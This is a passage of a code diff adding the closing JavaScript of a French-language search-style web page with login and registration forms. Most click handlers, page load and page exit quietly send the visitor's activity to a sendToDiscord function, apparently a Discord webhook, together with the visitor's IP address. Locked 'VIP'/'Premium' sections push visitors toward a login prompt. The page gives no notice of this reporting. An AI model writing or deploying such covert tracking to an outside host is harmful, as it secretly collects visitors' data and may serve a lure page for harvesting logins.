+        });
+
+        sortBtn.addEventListener('click', async () => {
+            const sortTypes = ['Pertinence', 'Date récente', 'Date ancienne', 'Confiance élevée', 'Source fiable'];
+            const randomSort = sortTypes[Math.floor(Math.random() * sortTypes.length)];
+            
+            await sendToDiscord({
+                type: 'navigation',
+                title: 'Tri des résultats',
+                section: `Tri par ${randomSort}`,
+                important: false
+            });
+            
+            alert(`Tri "${randomSort}" appliqué (simulation)`);
+        });
+
+        notificationBtn.addEventListener('click', async (e) => {
+            await sendToDiscord({
+                type: 'notification',
+                title: 'Notifications consultées',
+                content: 'Utilisateur a ouvert le panneau de notifications',
+                important: false
+            });
+            
+            notificationOverlay.classList.toggle('active');
+        });
+
+        closeNotificationsBtn.addEventListener('click', () => {
+            notificationOverlay.classList.remove('active');
+        });
+
+        loginToggle.addEventListener('click', () => {
+            togglePasswordVisibility('login-password', 'login-toggle');
+        });
+
+        registerToggle.addEventListener('click', () => {
+            togglePasswordVisibility('register-password', 'register-toggle');
+        });
+
+        confirmToggle.addEventListener('click', () => {
+            togglePasswordVisibility('register-confirm-password', 'confirm-toggle');
+        });
+
+        // Track all navigation clicks
+        navLinks.forEach(link => {
+            link.addEventListener('click', async (e) => {
+                e.preventDefault();
+                const section = link.querySelector('span').textContent;
+                
+                await sendToDiscord({
+                    type: 'navigation',
+                    title: 'Navigation dans le menu',
+                    section: section,
+                    important: false
+                });
+                
+                // Simulate navigation
+                if (section.includes('VIP') || section.includes('Premium')) {
+                    alert(`La section "${section}" nécessite un compte premium. Veuillez vous connecter.`);
+                    authOverlay.style.display = 'flex';
+                    switchAuthTab('login');
+                } else {
+                    alert(`Section "${section}" sélectionnée (simulation)`);
+                }
+            });
+        });
+
+        // Initialize
+        (async function init() {
+            userIP = await getIP();
+            createParticles();
+            addResultButtonListeners();
+            
+            // Check for URL parameters (simulating referral)
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('premium')) {
+                isPremium = true;
+                alert('Accès premium activé via lien de parrainage.');
+                
+                await sendToDiscord({
+                    type: 'premium_check',
+                    title: 'Accès premium activé',
+                    isPremium: true,
+                    important: true
+                });
+            }
+            
+            // Track time spent on page when user leaves
+            window.addEventListener('beforeunload', async () => {
+                const timeSpent = Math.round((new Date() - pageLoadTime) / 1000);
+                
+                await sendToDiscord({
+                    type: 'pageview',
+                    title: 'Utilisateur a quitté la page',
+                    timeSpent: `${timeSpent} secondes`,
+                    searches: searchCount,
+                    isPremium: isPremium,
+                    important: false
+                });
+            });
+            
+            // Simulate system status check
+            setTimeout(async () => {
+                await sendToDiscord({
+                    type: 'pageview',
+                    title: 'Vérification du statut système',
+                    status: 'Système opérationnel',
+                    version: '3.2.1',
+                    important: false
+                });
+            }, 5000);
+        })();
+    </script>
+</body>
+</html>
